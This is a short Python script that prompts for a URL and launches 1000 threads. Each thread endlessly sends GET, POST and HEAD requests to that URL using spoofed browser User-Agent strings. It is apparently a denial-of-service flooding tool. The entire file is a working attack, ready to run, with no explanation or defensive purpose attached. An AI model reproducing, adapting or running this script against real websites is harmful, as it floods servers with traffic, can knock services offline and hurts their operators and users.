import requests
from  threading import Thread
import random

users = [
     'Mozilla/5.0 (X11; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0.',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 OPR/76.0.4017.177.'
]
headers ={
    'User-Agent' : random.choice(users)
}
url = input('url: ')
def send():
    while True:
        requests.get(url, headers=headers)
        print("Get...")
        requests.post(url, headers=headers)
        print("Post...")
        requests.head(url, headers=headers)
        print("Head...")

if __name__ == '__main__':
    for i in range(1000):
        thr = Thread(target=send)
        thr.start()
